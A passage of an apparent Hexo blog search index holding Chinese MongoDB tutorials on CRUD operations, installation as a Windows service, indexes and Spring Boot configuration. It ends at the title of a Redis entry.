&#125;, status: &quot;D&quot; &#125;,   &#123; item: &quot;postcard&quot;, qty: 45, size: &#123; h: 10, w: 15.25, uom: &quot;cm&quot; &#125;, status: &quot;A&quot; &#125;,]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="删除单条数据"><a href="#删除单条数据" class="headerlink" title="删除单条数据"></a>删除单条数据</h2><pre class="line-numbers language-none"><code class="language-none">db.inventory.deleteOne( &#123; status: &quot;D&quot; &#125; )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即使有多条满足条件也只删除一条。</p><h2 id="删除多条数据"><a href="#删除多条数据" class="headerlink" title="删除多条数据"></a>删除多条数据</h2><pre class="line-numbers language-none"><code class="language-none">db.inventory.deleteMany(&#123; status : &quot;A&quot; &#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="删除所有数据"><a href="#删除所有数据" class="headerlink" title="删除所有数据"></a>删除所有数据</h2><pre class="line-numbers language-none"><code class="language-none">db.inventory.deleteMany(&#123;&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>1、删除操作不会删除索引，即使删除所有数据。<br>2、所有的单条数据写操作都是原子性的。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB 安装、配置、启动、连接</title>
      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/MongoDB%20%E5%AE%89%E8%A3%85%E3%80%81%E9%85%8D%E7%BD%AE%E3%80%81%E5%90%AF%E5%8A%A8%E3%80%81%E8%BF%9E%E6%8E%A5/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/MongoDB%20%E5%AE%89%E8%A3%85%E3%80%81%E9%85%8D%E7%BD%AE%E3%80%81%E5%90%AF%E5%8A%A8%E3%80%81%E8%BF%9E%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h2><blockquote><p><a href="https://www.mongodb.com/download-center">https://www.mongodb.com/download-center</a></p></blockquote><p>这里为了方便做测试所以用window版的，下载企业版的Windows 64位的，这是评估试用版的，虽然要求操作系统要Windows Server 2008 R2及以后的，但win7下也可用。</p><p>关于企业版的高级特性请<a href="https://www.mongodb.com/zh/products/mongodb-enterprise-advanced">点击</a>查看。</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>可以直接点bin下的mongod.exe运行并指定配置文件，路径等，也可以作为windows服务来启动，下面window服务配置为例。</p><p>1、添加Mongodb环境变量到path中。</p><p>2、新建配置目录</p><p><code>C:\MongoDB\data\log</code></p><p><code>C:\MongoDB\data\db</code></p><p>3、新建配置文件</p><p>C:\MongoDB\Server\3.4\mongod.cfg</p><pre class="line-numbers language-none"><code class="language-none">systemLog:    destination: file    path: C:\MongoDB\data\log\mongod.logstorage:    dbPath: C:\MongoDB\data\db<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4、安装配置：</p><pre class="line-numbers language-none"><code class="language-none">mongod --config C:\MongoDB\Server\3.4\mongod.cfg --install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><pre class="line-numbers language-none"><code class="language-none">net start mongodb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="停止"><a href="#停止" class="headerlink" title="停止"></a>停止</h2><pre class="line-numbers language-none"><code class="language-none">net stop mongodb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><p>可以输入命令行<code>mongo</code>，也可以使用客户端工具，推荐robomongo，有免费版和收费版。</p><blockquote><p><a href="https://robomongo.org/">https://robomongo.org/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB 插入数据用法</title>
      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/MongoDB%20%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE%E7%94%A8%E6%B3%95/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/MongoDB%20%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE%E7%94%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="主要方法"><a href="#主要方法" class="headerlink" title="主要方法"></a>主要方法</h2><pre class="line-numbers language-none"><code class="language-none">db.collection.insertOne()插入单条数据。db.collection.insertMany()插入多条数据db.collection.insert()        插入单条或者多条数据。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="插入单条"><a href="#插入单条" class="headerlink" title="插入单条"></a>插入单条</h2><p><code>db.collection.insertOne()</code>：MongoDB3.2开始支持。</p><p>语法：</p><pre class="line-numbers language-none"><code class="language-none">db.collection.insertOne(   &lt;document&gt;,   &#123;      writeConcern: &lt;document&gt;   &#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用：</p><pre class="line-numbers language-none"><code class="language-none">db.inventory.insertOne(   &#123; item: &quot;canvas&quot;, qty: 100, tags: [&quot;cotton&quot;], size: &#123; h: 28, w: 35.5, uom: &quot;cm&quot; &#125; &#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>insertOne不支持db.collection.explain()，需要使用insert。</p><h2 id="插入多条"><a href="#插入多条" class="headerlink" title="插入多条"></a>插入多条</h2><p><code>db.collection.insertMany()</code>：MongoDB3.2开始支持。</p><p>语法：</p><pre class="line-numbers language-none"><code class="language-none">db.collection.insertMany(   [ &lt;document 1&gt; , &lt;document 2&gt;, ... ],   &#123;      writeConcern: &lt;document&gt;,      ordered: &lt;boolean&gt;   &#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用：</p><pre class="line-numbers language-none"><code class="language-none">db.inventory.insertMany([   &#123; item: &quot;journal&quot;, qty: 25, tags: [&quot;blank&quot;, &quot;red&quot;], size: &#123; h: 14, w: 21, uom: &quot;cm&quot; &#125; &#125;,   &#123; item: &quot;mat&quot;, qty: 85, tags: [&quot;gray&quot;], size: &#123; h: 27.9, w: 35.5, uom: &quot;cm&quot; &#125; &#125;,   &#123; item: &quot;mousepad&quot;, qty: 25, tags: [&quot;gel&quot;, &quot;blue&quot;], size: &#123; h: 19, w: 22.85, uom: &quot;cm&quot; &#125; &#125;])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>1、所有的insert操作，如果集合不存在则会自动创建。<br>2、_id是唯一主键，如果没有指定MongoDB会自动生成。<br>3、所有的单条数据写操作都是原子性的。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB 数据库与集合特性</title>
      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/MongoDB%20%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E9%9B%86%E5%90%88%E7%89%B9%E6%80%A7/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/MongoDB%20%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E9%9B%86%E5%90%88%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<p><img src="https://docs.mongodb.com/manual/_images/crud-annotated-collection.bakedsvg.svg" alt="image"></p><h2 id="Databases（数据库）"><a href="#Databases（数据库）" class="headerlink" title="Databases（数据库）"></a>Databases（数据库）</h2><p>在MongoDB中，数据库是所有文档记录构成的集合的汇总，类似关系数据库中数据库与表的概念。</p><p><strong>创建数据库</strong></p><pre class="line-numbers language-none"><code class="language-none">use test;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建&#x2F;切换数据库，如果不存在则创建后切换，存在则直接切换。</p><h2 id="Collections（集合）"><a href="#Collections（集合）" class="headerlink" title="Collections（集合）"></a>Collections（集合）</h2><p>集合类似关系数据库中的表的概念，不过集合是没有表结构的。</p><p><strong>创建集合</strong></p><pre class="line-numbers language-none"><code class="language-none">db.myNewCollection1.insertOne( &#123; x: 1 &#125; )db.myNewCollection2.createIndex( &#123; y: 1 &#125; )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>插入记录、创建索引如果集合不存在都会自动创建该集合。</p><p>当然MongoDB也提供了<a href="https://docs.mongodb.com/manual/reference/method/db.createCollection/#db.createCollection">db.createCollection()</a>方法来创建集合，它提供了更多的创建选项，如最大集合容量、文档验证规则等。如果你要使用默认参数创建集合用上面的自动创建的方式就可以了。</p><h2 id="Document-Validation（文档验证）"><a href="#Document-Validation（文档验证）" class="headerlink" title="Document Validation（文档验证）"></a>Document Validation（文档验证）</h2><p>这是MongoDB3.2版本推出来的新功能，默认情况下MongoDB不强制要求文档记录有着相同的字段和数据类型，也可以说是集合里面的记录可以有着不同的字段和不同的数据类型，这和关系数据库完全不同，关系数据库表结构类型是固定好的。</p><p>但在3.2之后你可以为update和insert制定验证规则，如：</p><pre class="line-numbers language-none"><code class="language-none">db.createCollection( &quot;contacts&quot;,   &#123; validator: &#123; $or:      [         &#123; phone: &#123; $type: &quot;string&quot; &#125; &#125;,         &#123; email: &#123; $regex: &#x2F;@mongodb\.com$&#x2F; &#125; &#125;,         &#123; status: &#123; $in: [ &quot;Unknown&quot;, &quot;Incomplete&quot; ] &#125; &#125;      ]   &#125;&#125; )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果插入或者更新的数据不符合规则MongoDB可以设定不允许更新并报错的形式或者可以允许更新但同时会在日志中记录违反规则的数据。</p><p>验证规则更多细节请<a href="https://docs.mongodb.com/manual/core/document-validation/">点击</a>参考官方描述。</p><h2 id="文档结构修改"><a href="#文档结构修改" class="headerlink" title="文档结构修改"></a>文档结构修改</h2><p>可以更新MongoDB集合中的文档结构，如添加新字段、删除现有字段或更改字段类型、更新文档的新结构。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB 更新数据用法</title>
      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/MongoDB%20%E6%9B%B4%E6%96%B0%E6%95%B0%E6%8D%AE%E7%94%A8%E6%B3%95/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/MongoDB%20%E6%9B%B4%E6%96%B0%E6%95%B0%E6%8D%AE%E7%94%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="主要方法"><a href="#主要方法" class="headerlink" title="主要方法"></a>主要方法</h2><pre class="line-numbers language-none"><code class="language-none">db.collection.updateOne()更新单条数据，3.2开始支持。db.collection.updateMany()更新多条数据，3.2开始支持。db.collection.replaceOne()替换单条数据，3.2开始支持。db.collection.update()        默认更新或者替换多条数据，更新多条数据需要配置选项。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="示例集合"><a href="#示例集合" class="headerlink" title="示例集合"></a>示例集合</h2><pre class="line-numbers language-none"><code class="language-none">db.inventory.insertMany( [   &#123; item: &quot;canvas&quot;, qty: 100, size: &#123; h: 28, w: 35.5, uom: &quot;cm&quot; &#125;, status: &quot;A&quot; &#125;,   &#123; item: &quot;journal&quot;, qty: 25, size: &#123; h: 14, w: 21, uom: &quot;cm&quot; &#125;, status: &quot;A&quot; &#125;,   &#123; item: &quot;mat&quot;, qty: 85, size: &#123; h: 27.9, w: 35.5, uom: &quot;cm&quot; &#125;, status: &quot;A&quot; &#125;,   &#123; item: &quot;mousepad&quot;, qty: 25, size: &#123; h: 19, w: 22.85, uom: &quot;cm&quot; &#125;, status: &quot;P&quot; &#125;,   &#123; item: &quot;notebook&quot;, qty: 50, size: &#123; h: 8.5, w: 11, uom: &quot;in&quot; &#125;, status: &quot;P&quot; &#125;,   &#123; item: &quot;paper&quot;, qty: 100, size: &#123; h: 8.5, w: 11, uom: &quot;in&quot; &#125;, status: &quot;D&quot; &#125;,   &#123; item: &quot;planner&quot;, qty: 75, size: &#123; h: 22.85, w: 30, uom: &quot;cm&quot; &#125;, status: &quot;D&quot; &#125;,   &#123; item: &quot;postcard&quot;, qty: 45, size: &#123; h: 10, w: 15.25, uom: &quot;cm&quot; &#125;, status: &quot;A&quot; &#125;,   &#123; item: &quot;sketchbook&quot;, qty: 80, size: &#123; h: 14, w: 21, uom: &quot;cm&quot; &#125;, status: &quot;A&quot; &#125;,   &#123; item: &quot;sketch pad&quot;, qty: 95, size: &#123; h: 22.85, w: 30.5, uom: &quot;cm&quot; &#125;, status: &quot;A&quot; &#125;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="更新单条数据"><a href="#更新单条数据" class="headerlink" title="更新单条数据"></a>更新单条数据</h2><pre class="line-numbers language-none"><code class="language-none">db.inventory.updateOne(   &#123; item: &quot;paper&quot; &#125;,   &#123;     $set: &#123; &quot;size.uom&quot;: &quot;cm&quot;, status: &quot;P&quot; &#125;,     $currentDate: &#123; lastModified: true &#125;   &#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$set</code>：更新一个集合里面元素的值。</p><p><code>$currentDate</code>：更新lastModified的值为当前时间，如果不存在这个字段则创建。</p><h2 id="更新多条数据"><a href="#更新多条数据" class="headerlink" title="更新多条数据"></a>更新多条数据</h2><pre class="line-numbers language-none"><code class="language-none">db.inventory.updateMany(   &#123; &quot;qty&quot;: &#123; $lt: 50 &#125; &#125;,   &#123;     $set: &#123; &quot;size.uom&quot;: &quot;in&quot;, status: &quot;P&quot; &#125;,     $currentDate: &#123; lastModified: true &#125;   &#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="替换单条数据"><a href="#替换单条数据" class="headerlink" title="替换单条数据"></a>替换单条数据</h2><pre class="line-numbers language-none"><code class="language-none">db.inventory.replaceOne(   &#123; item: &quot;paper&quot; &#125;,   &#123; item: &quot;paper&quot;, instock: [ &#123; warehouse: &quot;A&quot;, qty: 60 &#125;, &#123; warehouse: &quot;B&quot;, qty: 40 &#125; ] &#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>1、所有的单条数据的写操作都是原子性的。<br>2、<code>_id</code>字段一旦生成了就不能被修改。<br>3、如果更新操作自动添加的数据超过了集合限定的大小，更新操作会重新组织磁盘上的文档数据。<br>4、更新操作会按照插入时候的顺序保存字段的顺序，但<code>_id</code>永远排第一位的，更新包括字段名的重命名可能导致文档中字段的重新排序。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><a href="https://docs.mongodb.com/manual/reference/operator/update/">点击</a>查看更多更新操作符。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB 查询数据用法</title>
      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/MongoDB%20%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E7%94%A8%E6%B3%95/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/MongoDB%20%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E7%94%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="示例集合"><a href="#示例集合" class="headerlink" title="示例集合"></a>示例集合</h2><pre class="line-numbers language-none"><code class="language-none">db.inventory.insertMany([   &#123; item: &quot;journal&quot;, qty: 25, size: &#123; h: 14, w: 21, uom: &quot;cm&quot; &#125;, status: &quot;A&quot; &#125;,   &#123; item: &quot;notebook&quot;, qty: 50, size: &#123; h: 8.5, w: 11, uom: &quot;in&quot; &#125;, status: &quot;A&quot; &#125;,   &#123; item: &quot;paper&quot;, qty: 100, size: &#123; h: 8.5, w: 11, uom: &quot;in&quot; &#125;, status: &quot;D&quot; &#125;,   &#123; item: &quot;planner&quot;, qty: 75, size: &#123; h: 22.85, w: 30, uom: &quot;cm&quot; &#125;, status: &quot;D&quot; &#125;,   &#123; item: &quot;postcard&quot;, qty: 45, size: &#123; h: 10, w: 15.25, uom: &quot;cm&quot; &#125;, status: &quot;A&quot; &#125;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="查询所有"><a href="#查询所有" class="headerlink" title="查询所有"></a>查询所有</h2><pre class="line-numbers language-none"><code class="language-none">db.inventory.find()db.inventory.find(&#123;&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="按条件查询"><a href="#按条件查询" class="headerlink" title="按条件查询"></a>按条件查询</h2><p>查询status&#x3D;’D’的数据。</p><pre class="line-numbers language-none"><code class="language-none">db.inventory.find( &#123; status: &quot;D&quot; &#125; )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="IN范围查询"><a href="#IN范围查询" class="headerlink" title="IN范围查询"></a>IN范围查询</h2><p>查询status in (‘A’, D’)的数据。</p><pre class="line-numbers language-none"><code class="language-none">db.inventory.find( &#123; status: &#123; $in: [ &quot;A&quot;, &quot;D&quot; ] &#125; &#125; )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="AND条件查询"><a href="#AND条件查询" class="headerlink" title="AND条件查询"></a>AND条件查询</h2><p>查询status&#x3D;’A’并且qty&lt;30的数据。</p><pre class="line-numbers language-none"><code class="language-none">db.inventory.find( &#123; status: &quot;A&quot;, qty: &#123; $lt: 30 &#125; &#125; )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="OR条件查询"><a href="#OR条件查询" class="headerlink" title="OR条件查询"></a>OR条件查询</h2><p>查询status&#x3D;’A’或者qty&lt;30的数据。</p><pre class="line-numbers language-none"><code class="language-none">db.inventory.find( &#123; $or: [ &#123; status: &quot;A&quot; &#125;, &#123; qty: &#123; $lt: 30 &#125; &#125; ] &#125; )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="AND-OR联合条件查询"><a href="#AND-OR联合条件查询" class="headerlink" title="AND OR联合条件查询"></a>AND OR联合条件查询</h2><p>查询status&#x3D;’A’并且(qty&lt;30或者item以p开头)的数据。</p><pre class="line-numbers language-none"><code class="language-none">db.inventory.find( &#123;     status: &quot;A&quot;,     $or: [ &#123; qty: &#123; $lt: 30 &#125; &#125;, &#123; item: &#x2F;^p&#x2F; &#125; ]&#125; )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><a href="https://docs.mongodb.com/manual/reference/operator/query/">点击</a>查看各种操作运算符用法。</p><p><a href="https://docs.mongodb.com/manual/reference/operator/query/regex/#op._S_regex">点击</a>查看正则表达式用法。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB 索引篇</title>
      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/MongoDB%20%E7%B4%A2%E5%BC%95%E7%AF%87/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/MongoDB%20%E7%B4%A2%E5%BC%95%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="MongoDB中的索引"><a href="#MongoDB中的索引" class="headerlink" title="MongoDB中的索引"></a>MongoDB中的索引</h2><p>MongoDB中的索引和其他关系数据库中的索引类似，MongoDB索引是集合级别的，支持在任何字段及子字段上创建索引。</p><p>索引支持MongoDB高效的查询，没有索引将会进行全集合扫描，而如果使用索引则会大大缩小扫描的范围。</p><p>索引是特殊的数据结构（B-tree），它将收集数据集的一小部分存储在一个易于遍历的表单中。索引存储指定字段的值并按值排序，支持高效的值相等匹配查询及范围查询，也能根据索引中值的顺序直接返回有序结果。</p><p>下图演示了索引中的匹配和排序查询，1代表升序，－1代表降序。</p><p><img src="https://docs.mongodb.com/manual/_images/index-for-sort.bakedsvg.svg" alt="image"></p><h2 id="索引类型"><a href="#索引类型" class="headerlink" title="索引类型"></a>索引类型</h2><p>MongoDB提供了许多索引类型来支持不同数据和查询的类型。</p><h4 id="1、默认的-id索引"><a href="#1、默认的-id索引" class="headerlink" title="1、默认的_id索引"></a>1、默认的_id索引</h4><p>在创建集合的时候就会为<code>_id</code>字段创建一个唯一索引，目的是为了防止<code>_id</code>字段值重复，这个索引不能被删除。</p><h4 id="2、单字段索引"><a href="#2、单字段索引" class="headerlink" title="2、单字段索引"></a>2、单字段索引</h4><p>MongoDB支持在单个字段上创建用户定义的顺序索引，而不用管是升序还是降序。</p><p><img src="https://docs.mongodb.com/manual/_images/index-ascending.bakedsvg.svg" alt="image"></p><h4 id="3、复合索引"><a href="#3、复合索引" class="headerlink" title="3、复合索引"></a>3、复合索引</h4><p>MongoDB也支持在多个字段上建立复合索引，复合索引中字段的顺序非常重要，如<code>{ userid: 1, score: -1 }</code>：先按userid升序，每个userid再按score进行降序。</p><h4 id="4、多键索引"><a href="#4、多键索引" class="headerlink" title="4、多键索引"></a>4、多键索引</h4><p>MongoDB使用多键索引来索引存储在数组中的内容，如果索引包含数组值的字段，MongoDB将为数组的每个元素创建单独的索引条目。这些多键索引允许查询选择包含数组元素或数组元素的文档，MongoDB会自动决定是否创建一个多键索引，如果索引字段包含数组值;您不需要显式地指定多键类型。</p><p><img src="https://docs.mongodb.com/manual/_images/index-multikey.bakedsvg.svg" alt="image"></p><h4 id="5、地理空间索引"><a href="#5、地理空间索引" class="headerlink" title="5、地理空间索引"></a>5、地理空间索引</h4><p>为了支持对地理空间坐标数据的有效查询，MongoDB提供了两个特殊的索引:在返回结果时使用平面几何的2d索引和使用球形几何返回结果的2d球面索引。</p><h4 id="6、全文索引"><a href="#6、全文索引" class="headerlink" title="6、全文索引"></a>6、全文索引</h4><p>MongoDB提供了一个文本索引类型，它支持在集合中搜索字符串内容。这些文本索引不存储特定于语言的stop单词(例如“the”、“a”、“或”)，并将单词集中在集合中，只存储根单词。</p><h4 id="7、哈希索引"><a href="#7、哈希索引" class="headerlink" title="7、哈希索引"></a>7、哈希索引</h4><p>为了支持基于散列的分片，MongoDB提供了一个散列索引类型，它索引了字段值的散列。这些索引在它们的范围内有一个更随机的值分布，但是只支持相等匹配，并且不能支持范围基。</p><h2 id="索引命令操作"><a href="#索引命令操作" class="headerlink" title="索引命令操作"></a>索引命令操作</h2><p><code>db.collection.createIndex()</code>：创建索引。</p><p><code>db.collection.dropIndex()</code>：删除指定索引。</p><p><code>db.collection.dropIndexes()</code>：删除所有索引。</p><p><code>db.collection.getIndexes()</code>：获取所有索引。</p><p><code>db.collection.reIndex()</code>：重建所有索引。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB 集成到SpringBoot</title>
      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/MongoDB%20%E9%9B%86%E6%88%90%E5%88%B0SpringBoot/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/MongoDB%20%E9%9B%86%E6%88%90%E5%88%B0SpringBoot/</url>
      
        <content type="html"><![CDATA[<h2 id="MongoDB启动器"><a href="#MongoDB启动器" class="headerlink" title="MongoDB启动器"></a>MongoDB启动器</h2><p>加入Spring Boot依赖后，添加MongoDB启动器即可。</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-boot-starter-data-mongodb&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="MongoDB配置"><a href="#MongoDB配置" class="headerlink" title="MongoDB配置"></a>MongoDB配置</h2><p>这是MongoDB自动配置的所有参考配置：</p><pre class="line-numbers language-none"><code class="language-none"># MONGODB (MongoProperties)spring.data.mongodb.authentication-database&#x3D; # Authentication database name.spring.data.mongodb.database&#x3D;test # Database name.spring.data.mongodb.field-naming-strategy&#x3D; # Fully qualified name of the FieldNamingStrategy to use.spring.data.mongodb.grid-fs-database&#x3D; # GridFS database name.spring.data.mongodb.host&#x3D;localhost # Mongo server host. Cannot be set with uri.spring.data.mongodb.password&#x3D; # Login password of the mongo server. Cannot be set with uri.spring.data.mongodb.port&#x3D;27017 # Mongo server port. Cannot be set with uri.spring.data.mongodb.reactive-repositories.enabled&#x3D;true # Enable Mongo reactive repositories.spring.data.mongodb.repositories.enabled&#x3D;true # Enable Mongo repositories.spring.data.mongodb.uri&#x3D;mongodb:&#x2F;&#x2F;localhost&#x2F;test # Mongo database URI. Cannot be set with host, port and credentials.spring.data.mongodb.username&#x3D; # Login user of the mongo server. Cannot be set with uri.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面是参考配置，连接本地的dev数据库。</p><pre class="line-numbers language-none"><code class="language-none">spring:   data:      mongodb:        host: 127.0.0.1        port: 27017        database: dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="MongoDB的使用"><a href="#MongoDB的使用" class="headerlink" title="MongoDB的使用"></a>MongoDB的使用</h2><p><strong>1、继承MongoRepository</strong></p><pre class="line-numbers language-none"><code class="language-none">import org.springframework.data.mongodb.repository.MongoRepository;public interface IpCodeRepository extends MongoRepository&lt;IpCode, String&gt; &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2、注入MongoTemplate</strong></p><pre class="line-numbers language-none"><code class="language-none">@Autowiredprivate MongoTemplate mongoTemplate;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>第一种是一种简单的使用方式，高级查询需要使用第二种。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是 MongoDB</title>
      <link href="/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/%E4%BB%80%E4%B9%88%E6%98%AF%20MongoDB/"/>
      <url>/2025/10/30/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/%E4%BB%80%E4%B9%88%E6%98%AF%20MongoDB/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是Mongodb"><a href="#什么是Mongodb" class="headerlink" title="什么是Mongodb"></a>什么是Mongodb</h2><p>MongoDB是一个开源的基于分布式文件存储的Nosql文档型数据库，由C++语言编写，旨在为WEB应用提供可扩展的高性能数据存储解决方案。</p><h2 id="什么是文档型数据库"><a href="#什么是文档型数据库" class="headerlink" title="什么是文档型数据库"></a>什么是文档型数据库</h2><p>数据库里面的记录叫BJSON，就类似json的一种数据结构，比json有更多的数据类型，<a href="https://docs.mongodb.com/manual/reference/bson-types/">点击</a>查看更多类型。</p><p><img src="https://docs.mongodb.com/manual/_images/crud-annotated-document.bakedsvg.svg" alt="image"></p><p>文档型数据库的优势：</p><p>1、文档里面的对象与许多编程语言中的原生数据类型对应。<br>2、嵌入式文档和数组减少了昂贵连接的需要。<br>3、动态模式支持流畅多态性。</p><h2 id="主要特性"><a href="#主要特性" class="headerlink" title="主要特性"></a>主要特性</h2><p>1、MongoDB支持高性能的数据持久化功能。</p><p>2、丰富的查询语言。</p><p>3、支持集群高可用性。</p><p>4、支持水平伸缩性，可扩展。</p><p>5、支持多种存储引擎。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis Linux 安装运行实战全记录</title>
